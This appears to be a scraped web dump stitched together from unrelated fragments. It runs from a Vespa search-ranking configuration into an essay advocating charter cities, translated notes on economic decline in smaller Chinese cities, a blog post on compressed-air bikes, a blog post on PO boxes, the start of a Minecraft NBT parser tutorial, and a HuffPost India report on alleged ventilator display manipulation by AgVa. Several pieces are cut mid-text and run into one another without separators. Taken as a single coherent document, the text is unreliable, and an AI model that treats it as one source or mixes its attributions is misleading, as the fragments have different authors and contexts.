        expression: bm25(title) + bm25(body)
    }
    second-phase {
        rerank-count: 10
        expression: onnx("rankmodel.onnx", "default", "output_1")
    }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The first-phase expression tells Vespa to calculate the BM25 score of the query
against the <code>title</code> and <code>body</code> fields. We use this as a first pass to avoid
evaluating the model on every document. The second-phase instructs Vespa to
evaluate <code>"rankmodel.onnx"</code> (the one exported from the
Transformers library) and calculate <code>"output_1"</code> with the top 10
candidates from the previous stage. Note that this isn’t the actual expressions
used in the sample app where the output from the model is sent through a linear
transformation for sequence classification.</p>

<p>Most transformer models have three inputs: <code>input_ids</code>, <code>token_type_ids</code> and an
<code>attention_mask</code>. The first is the token sequence for input and in this case is
the combined sequence of tokens …</p></div></div>

When entrepreneurs compete to offer better goods and services, good ideas "win" and spread. Older, less effective ways of doing things wither and die. As basic research and scientific breakthroughs advance what's possible, entrepreneurs with ambitious visions introduce new and better ways of doing things. In an open society with a market system, each of us is incentivized to learn from what works and creatively solve problems for each other. This is why our economy continues to grow, and goods and services continue to improve over time.									</p><p>As the world’s economy has grown more and more dynamic, governments haven’t kept up. Competition has destroyed many lumbering corporate bureaucracies; government bureaucracies have only grown. Automobile speed, safety, and reliability have increased by countless orders of magnitude since the invention of the Model T Ford; the time it takes government to build needed infrastructure has skyrocketed. Decades of innovation in infotech and logistics have brought us just-in-time supply chains and efficient procurement. Government procurement in America hasn't kept up with these best practices because it lacks transparency, incentives, and accountability. One example - out of thousands - that is particularly salient and frustrating today is that the US government spent millions on a contract for in- case-of-emergency ventilators that were never delivered even as COVID-19 became a national crisis. It’s obvious that the forces tied to our growing prosperity haven’t trickled over to public policy.&nbsp;</p><p>I am an American patriot and continue to spend much of my career helping to fix the government we have. Thousands of governments work with software companies I have founded such as OpenGov, Esper, and Palantir, which help better allocate trillions of taxpayer dollars, bring data and transparency to the regulatory state, or use cutting-edge technology to enable new workflows to achieve public policy goals and save billions of dollars compared to how things were done before. We’re proud to have partnered with extraordinary people in government to achieve great things. But fixing government from the inside is not enough; American government is too big and too entrenched in outmoded processes and only loosely accountable to the American public.&nbsp;</p><p>This is why I’m attracted to the concept of “charter cities”: legally independent city-states, or “special economic zones” which are free to innovate and establish better modes and methods of government than existing players. We should combine the lessons from the past century with new technologies to improve transparency, hold public servants accountable, and make government work better. The best way to drive innovative governance is for governments or aspects of governments to compete for citizens just as companies compete for customers. Governments must constantly innovate, respond to changing circumstances, and invent or adopt better ways of doing things – or else lose out to competitors.&nbsp;</p><p>I support the work of Patri Friedman at Pronomos Capital, Mark Lutter at the Charter Cities Institute, Balaji Srinivasan, and others in the space on the conviction that the concept of a charter city is revolutionary. Layers and layers of bureaucracy, lack of accountability, and other mistakes have enabled cost disease and crony capitalism in critical sectors, reduced the dynamism of our economy, and made the cost of living skyrocket for our middle and working classes. We need a revolution in governance.&nbsp;</p><figure id="w-node-bd55c1be8db6-dc1001ae"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effaad138630803dbfb48b7_FRAME_03_v04_HD.jpg" alt=""></p><figcaption>(An example of a charter city set in rural America.

Intuitively, anything my neighbor gains is a loss for me. In one sense, that’s true. As Nobel prize-winning economist Paul Romer explains, the world of physical objects - or collections of atoms - is finite and zero-sum. Any&nbsp;object I obtain is a loss for you and vice versa. So how is positive-sum growth possible? Ideas. Good ideas rearrange the world in ways that make the things in it more valuable.&nbsp;</p><p>The practice of farming, for example, didn’t create new atoms even as it dramatically expanded the food supply. It was a good idea that changed the world to make it more useful, allowing humanity to support a larger population at less cost. Bad ideas do the opposite. Soviet collectivized farms, for example, cost millions of lives.&nbsp;</p><p>Markets are positive-sum because good ideas are valuable. If I buy something from you, I’m telling you that I value what you’ve made. If you make a profit, it means you’ve increased the value of whatever raw supplies you started with. If you make a loss, you’ve destroyed value. A free market without cronyism is a machine that increases the value of the world by rewarding good ideas and punishing bad ones. When ideas compete, we all win because the best ideas change the world in ways that make all of us more prosperous.&nbsp;</p><p>Some of the most powerful ideas find expression in our laws and shape the actions of entire communities. The best collections of ideas - such as the United States constitution or English common law - don’t just change the physical world but establish frameworks within which people may act. Good laws make for a more prosperous society. Bad laws, such as those in Venezuela or North Korea, can have disastrous effects on everyone.&nbsp;</p><p>Unfortunately, governments improve more slowly than individuals and corporations because they face much less competition and their citizens have little choice. When a company does things badly, consumers punish it by buying a competitor’s product. But if your government taxes you to pay for something that's wasteful or inefficient, you can’t respond by not paying taxes. You can try to help design and support a more efficient version of the scheme, but politics, unlike markets, are not generally a place where the best ideas win or where the relevant ideas are even discussed. Ultimately, bad policies reduce economic growth and decrease tax revenues, but this takes years or decades, and government today is such a giant kludge of disparate aspects that it’s hard to tell which policies were at fault.&nbsp;</p><p>In theory, people can always move from one country to another. One might think that the threat of political “exit” would force countries to compete for citizens just as companies compete for customers - and to some degree this does happen at extremes. Countries with better laws attract more citizens and tax revenue and prosper over time [such as net inflow into the US]. Countries with bad laws lose population and power [such as Venezuela]. But there are serious barriers to political exit. It’s time- consuming and expensive to move, and it’s sometimes difficult to get permission to enter a new jurisdiction. Further, many countries have distinct advantages - such as tremendous natural resource endowments - that shelter them from the consequences of mismanagement. Finally, the best countries attract talented individuals who themselves attract others, and though laws make a difference over the long-run, network effects can persist for a long time even when beset by poor government.&nbsp;</p><figure id="w-node-a693ac26f297-dc1001ae"><p><img src="https://assets.website-files.com/5ef37c99b43a6fc5f535692d/5effab5f6dc9fca333884f6f_FRAME_01_v03_HD.jpg" alt=""></p><figcaption>(Set in rural America. Renders by The Cicero Institute / Joe Lonsdale)</figcaption></figure><p>Charter cities are new cities, founded on unpopulated land [we are lucky - the vast majority of land is still open!], which are allowed autonomous commercial law and semi-autonomous governments and justice systems. The idea is simple: found new cities, free from old bureaucratic and legal structures, and explore bold new visions of how government should work. Market them to people who choose to join and see what the world learns.&nbsp;</p><p>Charter cities must attract new residents to survive. This is a powerful incentive to make laws clear and fair, build responsive public institutions, provide economic opportunity, and come up with new ideas to outcompete incumbent competitors. There’s no one way to achieve these ends, so charter cities will also compete with each other to design and implement innovative governance regimes.&nbsp;</p><p>We know that competition in government works because it’s been done before. The United States, for example, is prosperous in part due to a federalist system that forces each state to compete as a laboratory of democracy within a federal framework that makes it easy to move from state-to-state. 1846, for example, New York became the first state to fully abolish rules for corporate charters under which corruption was rampant because the legislature used to decide which businesses were allowed to incorporate. Over the latter half of that century, this measure spread from state to state and became ubiquitous.&nbsp;</p><p>Of course, the biggest success stories come from the most radical experiments. Over the course of a century, Hong Kong developed from a standard port city into one of the most prosperous cities in the world - even as mainland China stagnated under communism. Good laws made Hong Kong wealthy. The Chinese, recognizing this, set up in 1980 a special economic zone in the Shenzhen area nearby where some normal economic restrictions were waived to more closely resemble Hong Kong. The area grew by more than an order of magnitude in population and prosperity in the first 20 years of its existence. Deng Xiaoping’s special economic zone experiments were the basis for China’s gradual liberalization. By showing what kinds of laws attract capital and commerce, Hong Kong and Shenzhen transformed all of China.&nbsp;</p><p>The most successful charter cities will likely guarantee and protect individual liberties, have a fair legal system with clear and just laws and decisions based on precedent, and treat businesses and workers fairly with a transparent regulatory structure. These features have made several small cities like Hong Kong and Singapore …</p></div></div></div></div></div>

<p>Even with so much<span></span> <span>“</span>the sky’s falling in China” rhetoric, you’ll still find a lot of optimistic, forward-looking people here. But there’s a stark contrast between attitudes in Beijing/Shenzhen/etc and sub-tier 1 cities that urbanization has seemingly left behind.</p>
<p>Below are observations Chinese millennials made when they visited their hometowns during this year’s Spring Festival week (aka Chinese New Year). These were shared on Wechat a bit (unknown who original curator is). I thought it’d be interesting to translate and re-share here.</p>
<h3 id="observation-of-a-tier-4-chinesecity">Observation of a Tier 4 Chinese&nbsp;city</h3>
<ol type="1">
<li>As local coal mines goes from reducing and suspending production to filing bankruptcy, their workers are first delayed and denied wages before being laid off.</li>
<li>The local real estate market is stagnant. Ongoing construction projects are left unfinished. Completed property don’t sell.</li>
<li>Local cigarette factories see their sales over the past year go into decline and begin to cut production.</li>
<li>Food and fruit princes drop. So does the income of farmers.</li>
<li>More labor sitting idle and less income for workers.</li>
<li>Infrastructure construction continues to go strong. The business at a local stone supplier to road construction projects is flourishing.</li>
</ol>
<p>Reflection:</p>
<ol type="1">
<li>The energy sector, including coal and oil, and real estate sector are the first to be affected by the economic crisis. The situation continues to deteriorate, with no optimistic outlook.</li>
<li>The reach of the economic crisis is expanding to more sectors. Even cigarette companies, which have enjoyed high profit margin, are suffering. The management pins the blame on the restriction on consumption using public funds. The restriction has been in place for a number of years, its impact is already evident from the plummeting stock prices of white liquor or baijiu manufacturers. However, during all these years, the margin of cigarette industry has remained stable. An article published last year even said that the cigarette industry was the most lucrative business in China. Therefore, what is going on in local cigarette companies is related to local economy and local income.</li>
<li>The revenue decline of coal mines and cigarette factories, which used to be local cash cows, will trigger a series of consequences and affect the overall local consumption level. As a result of layoffs and shrinking demand, local spare labor force has grown. The income of local workers has declined due to an oversupply of labor.</li>
<li>Infrastructure construction is the only sector holding up while coal mines, local consumption and real estate are suffering. Considering the backwardness of the local infrastructure, this sector still has room to grow, as long as investment is in place. But where does the money come from? Local government is already heavily in debt. It all comes down to how much the central government is willing to support.</li>
</ol>
<h3 id="observation-of-a-chinese-county-known-fortourism">Observation of a Chinese county known for&nbsp;tourism</h3>
<ol type="1">
<li>Local automobile part factories and steel plants close down.</li>
<li>Heavy polluter chemical industry is doing fine, but production is limited.</li>
<li>Advertisement agencies are doing alright.</li>
<li>Plenty of car sales were made at the second half of 2015, with many new cars spotted on the road.</li>
<li>Tourism industry has declining sales.</li>

<li>Economy seems to be really struggling. Several large local clothes OEMs are faced with the risks of closing down. Making money is becoming increasingly difficult. So is collecting receivables.</li>
<li>Sales are difficult to make in the real estate sector.</li>
<li>Quality commercial property is needed.</li>
<li>Retail sellers on Wechat are everywhere. Overseas shopping agents are on Wechat. People go on the platform to sell designer handbags from local OEMs, clothes and even vegetables and honey. It is the absolute trend. Wechat public accounts have penetrated almost every industry. For example, by following the Wechat public account of a karaoke place, people can order and switch songs on their phone. An extremely popular local account is Zhang Shang Ji Mo, a local fusion of portal website, meituan and 58.com. It is said that even some villages have their own public accounts on Wechat.</li>
<li>Taxi hailing apps are highly popular.</li>
<li>Traffic congestion is serious.</li>
<li>Smog is serious in winter, but no one cares about the level of <span>PM</span> 2.5. No one on the street wears masks even when <span>PM</span> 2.5 level shoots over 300.</li>
<li>Gyms have recently begun to grow. Whether you are a worker, a small business owner or a civil servant, everyone loves iPhone, but many of those over 40 years old use Huawei or even Oppo phones.</li>
<li>Red packets on Wechat are all the rage.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><h2>Compressed air is a sustainable alternative to batteries and fossil fuels. Despite this, it has been disappearing from the public eye.</h2>
<p>I first became interested in compressed air as a fuel source during a visit to The Hartebeesthoek Radio Astronomy Observatory (HartRAO) during a cub-scout camp many years ago. We made rockets out of Coca-Cola bottles pumped up with a bicycle pump; makeshift fins held on with cello-tape. After a brief pumping the pent-up energy overcame the nozzle’s friction, the bottle-rocket would detach from the pump, and would blast off into space.</p>
<p>Alternative forms of energy storage have always been fascinating. From <a href="https://en.wikipedia.org/wiki/Pumped-storage_hydroelectricity"> pumped hydroelectric energy storage</a> to <a href="https://en.wikipedia.org/wiki/Flywheel_energy_storage">flywheel energy storage</a> . I recently stumbled upon this article on Low-Tech magazine about <a href="https://solar.lowtechmagazine.com/2018/05/ditch-the-batteries-off-grid-compressed-air-energy-storage.html"> compressed air energy storage (CAES)</a> . It rekindled my interest in using compressed air as a way to conserve power, overcoming the <a href="https://en.wikipedia.org/wiki/Duck_curve"> duck’s head problem</a> of some sustainable energy production techniques like solar and wind power.</p>
<p>The concept of CAES is fairly simple: compress air while there is energy production (the sun is up) for later use. The flow of energy can then be turned up or down depending on the demand by increasing or decreasing the flow of air.</p>
<p>Larger-scale CAES plants are fairly inefficient since compressing air generates heat (the second law of thermodynamics) and decompressing air cools it down significantly. Due to this, we will not be talking about CAES for large scale power storage, but for powering vehicles. Specifically, the humble bike.</p>
<p>A compressed-air vehicle is fuelled by tanks of pressurised atmospheric gas and propelled by the release and expansion of the gas within a pneumatic motor. These vehicles are comparable to battery-powered vehicles, with energy generation being displaced from the vehicle itself to a power plant where lower source emissions are possible and the net production of pollutants can be reduced.</p>
<p>The energy is stored in a pressurised tank on the vehicle which can be refilled or swapped out (hypothetically) at service stations, or refilled by plugging an onboard compressor into the electricity grid. Compressed air in 300 bar containers has energy density comparable to lead-acid batteries.</p>
<p>There have been few examples of compressed air vehicles in history such as the Gottardbahn pneumatic locomotive and <a href="https://en.wikipedia.org/wiki/Fireless_locomotive"> Fireless locomotives</a> .</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/07/CompressedAirLocomotive_Section1_AdolpheBraun1811to1877.jpg" alt=" Gotthardbahn"></p>
<p>Torpedos have also been known to use compressed air as a propulsion mechanism.</p>
<h3>What makes pneumatic vehicles interesting?</h3>
<p>The sounds of a city are the sounds of traffic. During the first week of lockdown was the first time I had ever heard a truly quiet city. The sounds of vehicles dominate the soundscape of cities. A city without internal combustion engines would be a much more peaceful place to live.</p>
<p>The cost of building pneumatic bikes are potentially much smaller than both internal combustion and electric motorbikes due to the simplicity of their design and the lack of special materials required in their construction. Lest we forget, internal combustion engines work by carefully exploding fuel and directing the explosions in a useful way.</p>
<p>Compressed-air vehicles are comparable in many ways to electric vehicles in their advantages but without the need for environmentally hazardous chemicals such as gasoline or battery acids/metals. Cylinders also do not need to be changed out every few years like electrochemical batteries and have a much longer operational life due to the simplicity of their structure.</p>
<p>The rate of self-discharge is very low when compared to batteries that deplete their charge slowly over time. Therefore, the vehicle may be left unused for longer periods than electric alternatives.</p>
<p>These cylinders can be swapped out at filling stations easily or charged while parked using solar power or done at home by hooking it up to the electrical grid.</p>
<p>Due to social distancing measures taken in big cities such as London and Paris, cycling for transport has spiked again, with new cycle-only paths and roads becoming the norm. Having personal vehicles as opposed to taking public transport will be standard for the foreseeable future while we deal with this pandemic.</p>
<h3>There are some downsides</h3>
<p>Any conversion of energy between forms results in a loss. For compressed-air cars, energy is lost when electrical energy is converted to compressed air, and when that stored energy is converted into kinetic energy to turn the motor.</p>
<p>When air expands it cools dramatically. This energy loss could be used for something, but for now let’s just assume that it is lost to the atmosphere on an air-powered motorbike. Similarly, tanks get very hot when filled rapidly. SCUBA tanks can be immersed in water to cool them while being filled, but this also results in energy loss.</p>
<p>Refuelling a compressed air container at home may take as long as 4 hours, while refilling on specialised equipment may fill the tank in 3 minutes while dealing with the excess heat in some (hopefully productive) way.</p>
<p>The final issue with CAES for propulsion is that while batteries can somewhat maintain their voltage throughout their discharge, the pressure of compressed air tanks falls as the air is released, effectively providing less propulsion over time.</p>
<h3>Experimental cars and bikes</h3>
<p>For this article, we will be focussing specifically on bikes, as there are a few problems with air-powered cars as the power necessary to propel a car is vastly greater than the amount necessary to propel a bike. While the majority of the energy required for driving a car is used in moving the car itself, the inverse is true for a bike where an air propelled bike would likely weigh half of the weight of the rider.</p>
<p>There have been a whole host of functional prototypes for bikes running on nothing but compressed air. The <a href="https://web.archive.org/web/20110218141158/http://www.ecofriend.org/entry/eco-bikes-green-speed-air-powered-motorcycle-aims-to-smash-land-speed-record/"> Green Speed Air Powered Motorcycle</a> using the Angelo Di Pietro compressed air engine made some noise in 2009.</p>
<p><img src="https://inhabitat.com/wp-content/blogs.dir/1/files/2012/11/o2-pursuit-final_363-600x480.jpg" alt="O2 Pursuit"></p>
<p>In 2011 the <a href="https://www.coroflot.com/deanbenstead/O2-Pursuit-Prototype"> O2 Pursuit Prototype by Dean Benstead</a> boasted a range of 100km per tank and top speeds of 140km/h, using a modified Yamaha WR250R and also using EngineAir’s Angelo Di Pietro motor. It even won a <a href="https://newatlas.com/2012-james-dyson-award-finalists/24630/"> James Dyson award</a></p>
<p>There have been multiple successful engineering projects. Some built by engineering students, some by hippies or handymen at home. <a href="https://bikeportland.org/wp-content/uploads/2016/03/pneu-Cory-lead-ted-800x789.jpg"> Cory Little</a></p>
<p>Even Peugeot, Suzuki, Toyota, and Tata had some form of air-powered vehicles in the works.</p>
<h3>Then things go silent</h3>
<p>My research on pneumatic vehicles took me on nostalgia-inducing trips through the “old internet” of personal blogs, unmaintained news sites, and enthusiast journals. There were a LOT of broken links as web pages were removed over the years, domains expired, and server fans stopped spinning.</p>
<p>Around 2012 talk about pneumatic and air-powered vehicles goes quiet. The plans of releasing some promising pneumatic motorbikes to the public seems to completely disappear. Toyota, Tata, Peugeot and Suzuki (as far as I can tell) abandon their plans to release air powered vehicles. <a href="https://en.wikipedia.org/wiki/AIRPod"> 1</a> <a href="https://www.lesechos.fr/2015/01/psa-la-revolution-de-lhybrid-air-naura-pas-lieu-190742">2</a></p>
<p>I’m generally not a conspiracy theorist, but I believe that air-powered vehicles may have been suppressed (see what I did there). The technology is sound, and if prototypes built by engineering students can work well enough, imagine what could happen if a well-funded company developed an air-powered motorbike.</p>
<p>Maybe there’s something I don’t know about. Maybe the tech is actually a lot more complicated than I am led to believe, but that still leaves the question: Who killed the pneumatic bike?</p>

<p><em>Because bacon takes forever to cook I’m writing this entire thing from the kitchen. Make your jokes accordingly. </em></p>



<p>The number one suggestion I see for people trying to get a following for their newly written book, program, etc is to start a newsletter. Here in the US at least that has some rules that go along with it. Sure, you can start a newsletter with a few dozen folks, send an email each month and not end the world. However, if you want to set up a real email service you’ll need to add something to the very end of it, your address. <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">Legally in the US you have to put both a real working unsubscribe link and a real live address. </a>Mailchimp, Substack, and Tinyletter all have this built in when you set up your profile the address you put in gets added automatically. </p>



<p>You don’t want to put your physical home address on the wilds of the internet. I’m sure someone out there has your credit card info in a txt file along with your real address, but what we’re worried about is the 99.9999% of other folks out there who don’t need extraordinarily easy access to that info. Not everyone has a work office address either. </p>



<p>Is a PO Box expensive? Depends on the size of box. The smallest one at my Post Office is about $6.25 a month, just a dollar over what I pay for my web hosting. Not so bad is it? Typically they charge in blocks of 3, 6 , or 12 months and send you little reminders that your account is about to get charged, no shady business with the USPS. I haven’t bought one of the boxes from UPS or other commercial mail services but I’m sure they are similar. </p>



<p>Did I get a PO Box just for a newsletter? No, I originally got it to connect to my Ham radio information. When I got my license I had planned on buying some cool equipment and connecting to other hams and doing what’s called DXing and swapping QSL postcards after making contact. I<a href="https://en.wikipedia.org/wiki/QSL_card">t’s a super old custom but really cool. </a>Unfortunately I don’t’ have the hardware to do it just yet but maybe someday. </p>



<p>So I kept the PO Box. Luckily I had discovered fountain pens and with fountain pens come the excuse to use them on things like, you guessed it, writing letters. I found a few penpals on a subreddit but like most things there the letters dried up after two or three responses. It’s hard to keep in touch when either recipient gets busy. But it was nice to have a PO Box to let a stranger send me letters as opposed to handing out my real address. </p>

<p>Still, I kept the PO Box. Then I started the newsletter. Every self published book marketing guru on the planet claims that starting a newsletter and growing it to a billion numbers will result in sales for your fantasy/romance/scifi novel. Unfortunately I don’t write for any of those genres and my newsletter grew stagnant after about fifty subscribers. The thing about commercial fiction is that you have to write commercial fiction to use succeed in their marketing tactics. </p>



<p>But hey, I still have the PO Box! But why? Well, I started sending postcards to friends and family. Not to sell them anything but to send thanks for something that would otherwise seem less personal in a text message. I put the PO box as the return address for these cards should someone else see the basically public note. </p>



<p>This is all great for me but what good is a PO Box for other folks? Literally any time you need to ship something to a person you don’t really know you should be using one. If you make 3D prints or printer components you want to use a PO Box to send parts from. If you develop PCB’s for your hobby and need to ship them to folks you’ll want to use one too. Really anything you make that you want to send to people you don’t <em>really</em> know. Stickers, zines, t-shirts, your bands latest album. With the whole selling things in a physical location being in the trash right now you can’t stand on the corner and sling products, you need a PO Box. </p>



<p>I guess this is the section where I put the pros and cons so here we go:</p>



<h4>Pros</h4>



<ul><li>Public Location Security</li><li>Cheaper than Netflix</li><li>Extra set of keys to feel important</li><li>Support your local post office</li></ul>



<h4>Cons</h4>



<ul><li>You have to drive to the post office to check the mail</li><li>They do cost money</li><li>You have to keep up with another set of keys</li><li>PO Box can’t be used as an address to register a business</li></ul>

<p>For some people who live out in the boonies, travel for extended periods of the year, or change apartments every 6 months a PO Box is a must have. Folks who have individual mailboxes are prone to easily stolen mail. Those of us with the big mailbox hub in a subdivision already know what it’s like to have mail come in a little locked box. Even those can be compromised as they’re out in the open and typically unlit at night. </p>



<p>I could come up with more reasons but the two packs of bacon are done and the battery on the laptop is about to die. Hope you enjoyed this wall of text. Enjoy your 4th of July weekend!</p>

<p>This week's post is about building a command line tool the view
<a href="https://en.wikipedia.org/wiki/Minecraft">Minecraft</a>
<a href="https://minecraft.gamepedia.com/NBT_format">NBT</a> files.
You will learn:</p>
<ul>
<li>How to unpack <a href="https://en.wikipedia.org/wiki/Binary_file">binary data</a>
with the <a href="https://docs.python.org/3/library/struct.html">struct</a> module.</li>
<li>How to write a <a href="https://en.wikipedia.org/wiki/Recursive_descent_parser">recursive
parser</a> for the
<a href="https://minecraft.gamepedia.com/NBT_format">NBT</a> file format.</li>
<li>How to turn the parsed data into a
<a href="https://en.wikipedia.org/wiki/JSON">JSON</a> friendly file format.</li>
</ul>
<p><a href="https://minecraft.gamepedia.com/NBT_format">Named Binary Tag</a> (NBT) files
store information about Minecraft in a simple <a href="https://en.wikipedia.org/wiki/Binary_file">binary file
format</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>NEW DELHI — Two former employees at controversial medical startup AgVa Healthcare told </span><em><span>HuffPost India</span></em><span> that the company manipulated the software running its low-cost ventilators to make the devices show they were pumping more oxygen into patients’ lungs than they actually were.</span></p><p><span>These startling revelations come after doctors at Mumbai’s prestigious JJ Hospital observed a variance between the actual performance of AgVa ventilators, and the performance registered on the device display. The AgVa ventilators were evaluated after JJ Hospital received 39 AgVa devices as a charitable donation. St. George Hospital, which is attached to JJ Hospital and is a dedicated Covid hospital, had received 42 AgVa ventilators.</span></p><p><span>The JJ Hospital report, written by a panel of five experienced doctors and reviewed by </span><em><span>HuffPost India</span></em><span>, said, “Maximum level of displayed FiO2 did not indicate actual delivered FiO2 as patient showed signs of desaturation upto 86% on multipara monitor.”&nbsp;</span></p><p><span>FiO2, or Fraction of Inspired Oxygen, refers to the percentage of oxygen in the air pumped into a patient’s lung — ranging from 21% (the percentage of oxygen naturally occurring in the atmosphere) to 100%, when pure oxygen is pumped into a patient’s lungs.&nbsp;</span></p><p><span>FiO2 is a crucial parameter for COVID patients. “When the lining of the lung gets diseased, patients need higher amounts of oxygen to ensure the body is able to extract enough oxygen,” said Dr Dileep Raman, an ICU specialist. “This happens in pneumonia, ARDS as well as in the case of COVID-19,” he explained.</span></p><p><span>The JJ Hospital report also echoes </span><a href="https://www.huffingtonpost.in/entry/agva-ventilators-pmcares-covid-19-order_in_5ef1ea38c5b6001a27157ccd"><span>several concerns raised by a panel of experienced doctors</span></a><span> in Ram Manohar Lohia Hospital in Delhi, who evaluated the AgVa ventilators at the direction of the Modi government’s health ministry. The JJ Hospital and RML Hospital reports flagged similar shortcomings: the AgVa ventilators evaluated were prone to failure, those that worked struggled to maintain critical parameters, the ventilators struggled to deliver high FiO2 percentages, and could not cater to the needs of critically ill patients in ICUs.&nbsp;</span></p><p><span>One AgVa ventilator, the JJ Hospital report noted, failed within five minutes of being plugged into a testing machine. Patients connected to the ventilators, the report said, “were getting restless, tachypneic, and were sweating.” Tachypnea refers to a state of rapid, abnormal, breathing.</span></p></div><div><p><span>Last month </span><em><span>HuffPost India</span></em><a href="https://www.huffingtonpost.in/entry/agva-ventilators-pmcares-covid-19-order_in_5ef1ea38c5b6001a27157ccd"><span>reported</span></a><span> that the RML Hospital panel initially rejected AgVa’s ventilators. The ministry then sent the ventilators for re-evaluation to a different panel of doctors who passed the ventilators with the caveat that AgVa’s ventilators were not substitutes for high-end, ICU-grade ventilators and should only be used in cases where a backup ventilator is available. As </span><em><span>HuffPost India</span></em><span>’s report noted, doctors from Gujarat, Haryana, Uttar Pradesh, Delhi and now Mumbai have raised concerns about the quality and performance of AgVa’s ventilators.</span></p><p><span>AgVa Healthcare has been in the limelight since March this year when the Modi government ordered 10,000 of the company’s Covid-model ventilators as part of India’s response to the novel coronavirus pandemic. The Modi government has responded to public criticism of its decision to buy AgVa products by insisting that the ventilators are suitable for treating Covid patients. The ventilators are now synonymous with Prime Minister Modi: the devices are being shipped bearing the logo of the Prime Minister’s </span><a href="https://www.huffingtonpost.in/entry/pm-cares-and-pmnrf-both-opaque-in-same-way-documents-show_in_5e8cbd55c5b6e1d10a6ad2c9"><span>opaque and unaudited PMCARES Fund</span></a><span>, and are a vital part of the government’s </span><a href="https://www.huffingtonpost.in/entry/pm-cares-bjp-leaders-share-photo-of-one-ventilator_in_5ee71201c5b6b54802e39ac2"><span>PR campaign</span></a><span> to deflect criticism that Modi did not do enough to prepare the country for the ongoing pandemic.&nbsp;</span></p><p><span>Now, the JJ Hospital report — </span><a href="https://mumbaimirror.indiatimes.com/coronavirus/news/81-made-in-india-ventilators-fail-the-test-at-city-hospitals/articleshow/76680531.cms" target="_blank"><span>first reported by the </span><em><span>Mumbai Mirror</span></em></a><span>— and the previously unreported accounts of two former employees revive concerns that AgVa Healthcare has overstated the capabilities of their low cost devices.</span></p><p><span>AgVa Healthcare has rejected claims by its former employees that the company manipulated its software to exaggerate the performance of its devices.&nbsp;</span></p><p><span>“This is a completely malafide and false comment. FiO2 can easily be checked on any ventilator by connecting an oxygen analyser to 1% accuracy. Any AgVa ventilator can be tested at any point of time by anyone,” AgVa founder Diwakar Vaish said in an email to </span><em><span>HuffPost India</span></em><span>. “Also, irrespective of what the ventilator shows, patients will not achieve 100% oxygen saturation if 100% FiO2 is required by the patient and can be checked on the patient monitor.”</span></p><p><span>The ventilators at JJ Hospital, Vaish said, were not installed by AgVa engineers and were a different, older, model from the ventilators.&nbsp;</span></p><p><span>“The ventilators were purchased by donors and distributed to these hospitals and initial installation done by some 3rd party without informing us,” Vaish said. “As our ventilator requires a proprietary breathing circuit and training, the doctors who used it initially did not operate it properly and this resulted in improper ventilation.”&nbsp;</span></p><p><span>AgVa is now providing its newest models to JJ Hospital, Vaish said, which were the same models being sold to the Indian government.</span></p><p><strong>FiO2 Issues</strong></p><p><span>One of the former AgVa employees who spoke to </span><em><span>HuffPost India</span></em><span> said that he noticed the problem in February this year. It was late evening and he</span><span> was in a hurry as five AgVa Advanced ventilators were going through their final checks before being shipped to a client.</span></p><p><span>“I was testing the devices and I noticed that the FiO2 is not even reaching 90%,” said the executive, who is no longer working at AgVa, and said he alerted a member of the technical team.&nbsp;</span></p><p><span>“He fixed FiO2 in five devices in just 10 minutes with simple lines of code,” the former employee&nbsp; said, seeking anonymity as he feared reprisals by the company. “FiO2 level is a hardware issue. How can you adjust it via computer? Then he said it’s not adjusted. It’s the same as before—just that the value is changed to show 95 , 97 , 99 or 100.”</span></p><p><span>“The computer coder puts a command in the ventilator that it will show 99-100% FIO2 reached even if it is 80%,” the former employee&nbsp; said. “I came to know about this computer code manipulation in February only after it was done in front of me by mistake.”</span></p><p><span>Ashwani Kumar, a former AgVa sales executive, told </span><em><span>HuffPost India</span></em><span> that he had seen AgVa ventilators display they were hitting 80% FiO2 (80% oxygen) even when the devices were not connected to an oxygen source. He said he pointed out that the natural percentage of oxygen in air is only 21%, and asked how the ventilator showed it was delivering 80% oxygen without a separate source of oxygen.</span></p><p><span>“The data displayed by the ventilator is manipulated,” Kumar said. “It has been coded in a way to manipulate the FiO2 value.”</span></p><p><span>As noted earlier in the piece, Vaish from AgVa has rejected these accounts as “false” and completely “malafide”.</span></p><p><span>Both former employees also said that AgVa employees were often sent out to perform tasks that they were not formally trained for, such as ventilator installation and troubleshooting, a charge AgVa refutes.&nbsp;</span></p><p><span>The report by&nbsp; JJ Hospital’s doctors offers an example:. When the doctors first flagged problems with their AgVa ventilators, the company sent an employee named Surya Pratap to fix the problem.&nbsp;</span></p><p><span>“On 26 May 2020, these various issues including setting of FiO2 were discussed with Mr. Surya Pratap who did software upgradation in wards on AgVa ventilators which means that the ventilators were delivered for patient use without quality control assurance test which could be fatal to patients,” the JJ Hospital report says.</span></p><p><span>Vaish said, “We routinely upgrade the user interface software to the latest version during the installation. It is part of the SOP of the installation process.”</span></p><p><span>It is worth noting that the problems flagged by the doctors at JJ Hospital — ventilator failure, FiO2 delivery, desaturation of patients — are not typically user interface problems.</span></p><p><span>On LinkedIn, Surya Pratap describes himself as a “Digital Marketing Strategist” and a Marketing Specialist at AgVa Healthcare — a job he has held for one year and four months. His prior work experience involves three years in the BPO industry, and little to suggest he is qualified to troubleshoot critical bio-medical devices in a situation where lives are at stake.</span></p><p><span>In an email, Vaish from AgVa said “Surya Pratap is heading the service team of AgVa and has more than 100 service engineers under him across the country.”</span></p><p><span>Vaish sidestepped a question on how Pratap was qualified to lead a team of engineers.</span></p><p><span>“Surya Pratap joined us as a marketing specialist but soon became adept at serving and excelled in his job. Further, he has made his way to the top with his exceptional learning skills over the past months,” Vaish said. AgVa has over 500 employees, Vaish said, “more than” 100 of whom are service engineers.</span></p><p><span>A senior doctor who was part of the health ministry’s first clinical evaluation trial of AgVa’s Covid ventilators in May this year said the committee called for more validation as they felt the device had been rushed to market.</span></p><p><span>“We told them, don’t play with the lives of patients. Modify the machine, perfect the machine, don’t hurry it. That was our reason for calling for more validation,” the doctor said. “We should not compromise on ventilator quality. My Indian brothers and sisters should not be harmed by a product we have cleared. Which is why we said the ventilator needs more validation.”</span></p><p><a href="https://www.huffingtonpost.in/entry/agva-ventilators-pmcares-covid-19-order_in_5ef1ea38c5b6001a27157ccd"><span>As </span><em><span>HuffPost India</span></em><span> has 